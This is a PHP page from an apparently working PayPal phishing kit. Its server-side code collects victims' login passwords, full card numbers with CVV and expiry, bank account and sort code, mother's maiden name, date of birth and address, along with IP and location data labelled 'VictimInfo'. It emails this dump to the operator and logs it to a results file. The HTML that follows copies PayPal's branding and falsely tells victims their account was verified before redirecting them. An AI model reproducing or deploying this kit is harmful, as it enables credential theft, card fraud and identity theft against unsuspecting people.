<?php
ini_set('display_errors', false);
date_default_timezone_set('Europe/London');
require_once('inc/functions.php');
require_once('inc/include_page.php');
require_once('inc/configuration.php');



$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$mmn = $_SESSION['mmn'];
$postcode = $_SESSION['postcode'];
$telephone = $_SESSION['telephone'];
$address = $_SESSION['address'];
$town = $_SESSION['town'];
$ccname = $_POST['ccname'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['exp'];
$secode = $_POST['secode'];
$sortcode = $_POST['sc'];
$account = $_POST['ac'];
$_SESSION['sortcode'] = $_POST['sc'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = getUserIP();
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "Submitted by : " . getUserIP() . " (" . gethostbyaddr(getUserIP()) . ")";
$VictimInfo2 = "Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "serAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os : " . $systemInfo['os'] . "";
$data = "
[+] Full name : $name
[+] Date of birth : $dob
[+] Address : $address , $town , $postcode
[+] Phone : $telephone
[+] Email : $user
[+] MMN : $mmn
[+] Username : $user
[+] Password : $pass
[+] Card BIN : $BIN
[+] Card Bank : $Bank
[+] Card Type : $Brand $Type
[+] Cardholder Name : $ccname
[+] Card Number : $ccno
[+] Card Exp : $ccexp
[+] CVV : $secode
[+] Account : $account
[+] Sort Code : $sortcode
[+] $VictimInfo1
[+] $VictimInfo2
[+] $VictimInfo3
[+] $VictimInfo4
[+] $VictimInfo5
[+] Received : $date @ $time
";
$_SESSION['details'] = $data;

if ($emailSave == 1) {
	mail($email,  "PayPal from " . $_SERVER['REMOTE_ADDR'], $data);
}


if ($fileSave === 1) {
    $file = fopen('./logs/results.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}



?>

<!DOCTYPE html>
<html lang="en" class=" desktop js ">
   <!--<![endif]-->
   <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      
      <!--Script info: script: node, template:  , date: Sep 18, 2020 06:55:18 -07:00, country: RO, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKGxzSnx744Imj8Zwnss236po rlogid : co44wnEtPGcUFfncHdNfiYzk8RXve6%2FGEB3tioGtVVgP6HjN9u%2Fe8HV4TAeMKMi34gCBQjVSubu0VpWftt7EoxjPWhkMOA9I_165ecf6c048 -->
      <title>Loading</title>
      <link rel="shortcut icon" href="assets/files/pp_favicon_x.ico">
      <link rel="apple-touch-icon" href="assets/files/pp64.png">
	      <meta http-equiv="refresh" content="7; url=<?php echo $redirect; ?>" />

      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
      <link rel="stylesheet" href="assets/files/contextualLogin.css">
   </head>
   <body class="desktop" data-rlogid="co44wnEtPGcUFfncHdNfiYzk8RXve6%2FGEB3tioGtVVgP6HjN9u%2Fe8HV4TAeMKMi34gCBQjVSubu0VpWftt7EoxjPWhkMOA9I_165ecf6c048" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKGxzSnx744Imj8Zwnss236po" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/9acb4139b22ec760/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="49237730ab94c" data-show-hide-password="true" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-tealeaf-enable="true" data-csrf-token="xJ90OVOihrc7QcmoYkKxF8zpSZrGly/Koy2u0=" data-nonce="eSRabjefVVLRCOhPHpYOfZB22XVP0fkH5XP1FrcXv0cSRBoL" data-tealeaf-url="" data-cookie-banner-enabled="true" data-tpd-survey-enabled="true">
      <noscript>
         <p class="nonjsAlert" role="alert">Note: Many features on the PayPal website require JavaScript and cookies.</p>
      </noscript>
      <div id="main" class="main" role="main">
         <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
            <div class="corral">
               <div class="contentContainer activeContent contentContainerBordered">
                  <header>
                     <p class="paypal-logo paypal-logo-long"></p>
                  </header>
                  <h1 class="headerText accessAid">Log in to your PayPal account</h1>
                  <p id="phoneSubTagLine" class="subHeaderText hide hide">Already set up to use your phone number to log in? Type it below. Otherwise, click the link to log in with email.</p>
                  <div class="notifications"></div>
                  <!-- temporary addition of notification which will just be displayed after clicking next in the phone page. This is for mobile ID login initial ramp and should be removed when we do public credential check -->
                  <form action="#" method="post" class="proceed maskable" autocomplete="off">
						<p style="text-align: center;">
							<img src="assets/spin.gif" style="width: 70px;" /> <br /> <br />
							Your account has been verified successfully. <br />
							<br>
							You will now be redirected to the main page. <br />
							<br /> <br />
						
						</p>
				  </form>
              
               </div>
            </div>
         </section>
         <section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation - PayPal">
            <div class="corral">
               <div class="contentContainer contentContainerLean">
                  <div id="pending" class="verificationSubSection">
                     <h1 class="headerText">Open the PayPal app</h1>
                     <p id="uncookiedMessage" class="verification-message hide">Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p>
                     <p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p>
                     <div class="notifications"></div>
                     <div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="##" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span></div>
                     <div class="mobileNotification">
                        <p class="pin"></p>
                        <div class="mobileScreen"><img src="assets/files/icon-PN-check.png" alt="phone"></div>
                     </div>
                     <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="#" class="inlineLink showSurvey scTrack:try-password" pa-marked="1">Use password instead</a></p>
                     <div class="passwordInstead">
                        <div class="bubble-tooltip hide" id="passwordInsteadDropDown">
                           <ul class="moreoptionsGroup" id="passwordInsteadGroup">
                              <li><a href="#" data-reason="passwordReason1" pa-marked="1">I don't have this phone with me right now.</a></li>
                              <li><a href="#" data-reason="passwordReason2" pa-marked="1">I didn't receive the notification.</a></li>
                              <li><a href="#" data-reason="passwordReason4" pa-marked="1">I'll try this feature later.</a></li>
                              <li><a href="#" data-reason="passwordReason5" pa-marked="1">Other.</a></li>
                           </ul>
                        </div>
                     </div>
                     <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="##" id="resend" pa-marked="1">Resend</a><span class="sentMessage hide">Sent</span></p>
                  </div>
                  <div id="expired" class="hide verificationSubSection">
                     <header>
                        <p class="paypal-logo paypal-logo-long">PayPal</p>
                     </header>
                     <h1 class="headerText headerTextWarning">Sorry, we couldn't confirm it's you</h1>
                     <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
                     <button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Try Again</button>
                  </div>
                  <div id="denied" class="denied hide verificationSubSection">
                     <img alt="" src="assets/files/glyph_alert_critical_big-2x.png" class="deniedCaution">
                     <h1 class="headerText">Sorry, we couldn't confirm it's you</h1>
                     <p>Need a hand?, <a href="#" class="inlineLink scTrack:help" pa-marked="1">We can help</a>.</p>
                  </div>
               </div>
            </div>
         </section>
         <footer class="footer" role="contentinfo">
            <div class="legalFooter">
               <div class="extendedContent">
                  <ul class="footerGroup footerGroupWithSiblings">
                     <li><a target="_blank" href="#" pa-marked="1">Privacy</a></li>
                     <li><a target="_blank" href="#" pa-marked="1">PayPal</a></li>
                  </ul>
                  <p class="footerCopyright">Copyright © 1999-2020 PayPal. All rights reserved.</p>
               </div>
            </div>
         </footer>
      </div>
      <div class="transitioning hide" aria-busy="false">
         <p class="checkingInfo hide">Verifying your information…</p>
         <p class="oneSecond hide">Just a moment…</p>
         <p class="secureMessage hide">Securely logging you in...</p>
         <p class="oneTouchMessage hide"></p>
         <p class="retrieveInfo hide">Retrieving your info...</p>
         <p class="waitFewSecs hide">This may take a few seconds...</p>
      </div>
    </body>
</html>

